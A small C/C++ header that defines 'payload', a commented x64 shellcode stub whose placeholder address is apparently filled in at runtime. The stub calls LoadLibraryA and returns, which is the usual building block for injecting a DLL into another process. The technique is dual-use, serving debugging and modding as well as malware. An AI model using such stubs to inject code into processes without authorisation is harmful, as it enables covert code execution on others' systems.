#pragma once

unsigned char payload[] =
{
    0x48,0x83,0xEC,0x28,              // sub rsp,28h
    0x48,0xB8,                        // mov rax,imm64
    0,0,0,0,0,0,0,0,                  // LoadLibraryA address
    0xFF,0xD0,                        // call rax
    0x48,0x83,0xC4,0x28,              // add rsp,28h
    0xC3                              // ret
};

constexpr size_t Psize = sizeof(payload);